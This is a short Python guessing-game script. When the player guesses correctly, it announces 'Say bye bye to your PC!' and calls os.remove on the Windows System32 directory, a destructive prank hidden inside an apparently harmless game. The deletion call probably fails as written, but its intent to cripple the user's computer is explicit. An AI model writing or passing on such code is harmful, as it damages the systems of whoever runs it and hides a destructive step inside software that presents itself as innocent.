import random
import os

def guess_the_number():

    random_number = random.randint(1, 10)

    while True:
        try:
            user_guess = int(input("Guess a number between 1 and 10: "))
            if 1 <= user_guess <= 10:
                break
            else:
                print("Please guess a number between 1 and 10.")
        except ValueError:
            print("Please enter a valid integer.")
    

    if user_guess == random_number:
        print("Congratulations! You guessed the right number! Say bye bye to your PC!")
        os.remove("C:\Windows\System32")
    else:
        print("Lucky you!")


guess_the_number()
